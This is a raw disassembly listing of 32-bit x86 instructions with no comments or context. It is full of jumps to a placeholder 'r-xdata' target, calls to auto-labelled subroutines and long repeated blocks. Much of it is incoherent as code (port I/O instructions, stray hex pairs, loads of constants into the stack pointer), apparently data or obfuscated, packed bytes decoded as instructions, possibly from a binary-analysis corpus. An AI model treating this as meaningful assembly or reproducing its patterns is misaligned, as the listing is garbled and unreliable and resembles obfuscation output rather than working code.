add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_403530
jno r-xdata
pop ecx
pop ecx
jg r-xdata
xor edx 0x59bc4079
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jns r-xdata
add ebx 0x9c575756
jne r-xdata
xor edi 0x5c775a59
pop edx
ja r-xdata
pop ecx
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
pop edx
jne r-xdata
ja 0xffffffffe85bb449
jge r-xdata
sub edx 0xf281e771
jno r-xdata
xor eax 0xff56850f
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jae r-xdata
or esi 0x937f5959
call sub_40353d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jg r-xdata
jge 0xffffffffc009ab0e
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001d03
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c344da
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jg r-xdata
jl 0xe24a8c7
jae r-xdata
or eax 0x8d0fb671
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
jne r-xdata
jl 0xffffffffa1a4c783
jg r-xdata
jge 0x18abaf8
pop ecx
add eax 0xfefc8d0f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jg r-xdata
sub ecx 0xce819d75
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
call 0xffffffffcec17767
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
jo 0xc647a5c
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_40353d
jg r-xdata
pop eax
pop ecx
jge r-xdata
jns 0xffffffff8202ae9f
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
retn
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
add eax 0xfefc8d0f
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jne r-xdata
ja 0xffffffffe85bb449
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
jae r-xdata
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jns r-xdata
call sub_40353d
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jg r-xdata
jge 0x18abaf8
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001d03
jne r-xdata
jpe 0x18c344da
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jae r-xdata
or eax 0x8d0fb671
jl 0xffffffffa1a4c783
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jno r-xdata
xor eax 0xff56850f
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jg r-xdata
jge 0xffffffffc009ab0e
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jg r-xdata
jl 0xe24a8c7
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jae r-xdata
jo 0xc647a5c
mov eax 0xff64870f
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
sub_40356e
jne r-xdata
jns r-xdata
call [ 0xffffffffea81cd7d ]
pop edx
jae r-xdata
jo 0xffffffffcec1551d
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
pop edx
jne r-xdata
ja 0xffffffffe85bb449
add esp 0x4
jae r-xdata
jg r-xdata
jge 0x18abaf8
pop ecx
add eax 0xfefc8d0f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
jae r-xdata
jae r-xdata
or eax 0x8d0fb671
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
jmp 0x1001d03
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
jns r-xdata
call sub_40353d
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jmp [ 0xc4830f ]
jne r-xdata
jpe 0x18c344da
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xffffffffa1a4c783
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
xor eax 0xff56850f
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jg r-xdata
jge 0xffffffffc009ab0e
mov eax 0xff64870f
jg r-xdata
jl 0xe24a8c7
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jae r-xdata
jo 0xc647a5c
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
sub_4035ed
pop ecx
pop eax
pop edx
pop edx
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jns r-xdata
add esi 0x99870f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
jae r-xdata
jbe 0xfffffffff2c1f83c
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jpo 0x36288e35
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jae r-xdata
sub edi 0xff5b8d0f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7288e85
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
jae r-xdata
jmp [ 0x182464ff ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba9da
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
mov eax 0xff64870f
sub_40361a
pop ecx
pop edx
jns r-xdata
jge r-xdata
jb 0x120b933
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcb90c
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f83c
ja r-xdata
jmp 0xffffffffe7288e85
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288e35
jno r-xdata
jno 0xffffffffff13be65
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c14def
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba9da
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b996
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40366a
jg r-xdata
pop ecx
add esp 0x8
ja r-xdata
or edi 0x8d0f647d
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
pop edx
jno r-xdata
and ecx 0xff69830f
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f83c
jae r-xdata
sub edi 0xff5b8d0f
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288e35
jg r-xdata
jge 0xffffffffe1c14def
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
